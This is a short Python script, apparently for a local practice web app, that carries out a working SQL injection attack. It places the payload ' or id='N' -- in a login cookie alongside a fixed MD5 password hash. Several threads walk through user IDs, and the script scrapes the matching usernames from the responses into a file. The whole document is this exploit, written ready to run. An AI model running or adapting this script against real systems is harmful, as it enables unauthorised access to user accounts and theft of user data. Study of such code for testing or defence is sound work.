from re import search
import threading
from tokenize import group
from requests import get,post


# Define the target url. 
url="http://localhost:8080"

def find(ID):
    
    global url
    cookies={'username':"' or id='"+str(ID)+"' -- ",'pass':"e10adc3949ba59abbe56e057f20f883e"}
    # data= "username="+user+"&password="+pwd
    x = get(url,cookies=cookies)
    print("seeking data from user id = "+ str(ID))
    if x.status_code == 500:
        return False
    user=search("text-dark'>(.*?)</a>",x.text)
    if user != None :
        with open('python-script/found.txt','a') as f:
            f.write(f"username:{user.group(1)};id:{ID}\n")
        return True
    else:
        return False

def start(port):
    for i in range(port) :
        myThread(int(i)+1,port=port).start()



class myThread (threading.Thread):
    def __init__(self, threadID,port):
      threading.Thread.__init__(self)
      self.threadID = threadID
      self.port= port
    def run(self):
        self._process(self.threadID,port=self.port)

    def _process(self,ID,port):
        counter= ID + port
        while  True:
            try:
                seek=find(counter)
                if seek==False:
                    print(f"No data for user id:{counter}")
                counter+=port
            except Exception as e:
                print(e)
                break
#starting program
## port is the number of threads will running. As many port as faster but too many can drop the network and load balance and producing error.
start(port=3)

